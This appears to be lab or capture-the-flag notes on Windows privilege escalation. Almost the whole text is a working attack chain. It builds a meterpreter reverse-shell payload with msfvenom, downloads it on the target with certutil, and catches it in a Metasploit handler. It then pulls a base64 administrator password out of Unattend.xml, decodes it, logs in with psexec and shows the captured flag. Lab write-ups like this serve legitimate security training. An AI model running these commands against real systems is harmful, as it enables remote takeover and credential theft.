- Interesting files (Base64 encoded):
	1. C:\Windows\Panther\Unattend.xml
	2. C:\Windows\Panther\Autounattend.xml

[LAB

- https://github.com/PowerShellMafia/PowerSploit

- **PowerSploit**: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.

- **PowerUp.ps1:** PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.


- Create a meterpreter payload (To get a meterpreter without having to exploit any vulns):
```bash
KALI:

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.37.5 LPORT=9000 -f exe > payload.exe
> python3 -m http.server

Windows Machine:
certutil -urlcache -f http://10.10.37.5/payload.exe payload.exe


Kali MSF:
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 9000
set LHOST 10.10.37.5
run

Windows:
Execute the payload
```

- Now that we are connected with meterpreter:
```bash
Meterpreter:
> cd C:\\
> cd Windows\Panther
> download unattend.xml

Kali:
> cat unattend.xml | grep -n2 Password
48-            </FirstLogonCommands>
49-            <AutoLogon>
50:                <Password>
51-                    <Value>QWRtaW5AMTIz</Value>
52-                    <PlainText>false</PlainText>
53:                </Password>
54-                <Enabled>true</Enabled>
55-                <Username>administrator</Username>

> echo QWRtaW5AMTIz | base64 -d
Admin@123

>  python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.2.24.168
> cd C:\Users\administrator\Desktop
> type flag.txt
097ab83639dce0ab3429cb0349493f60
```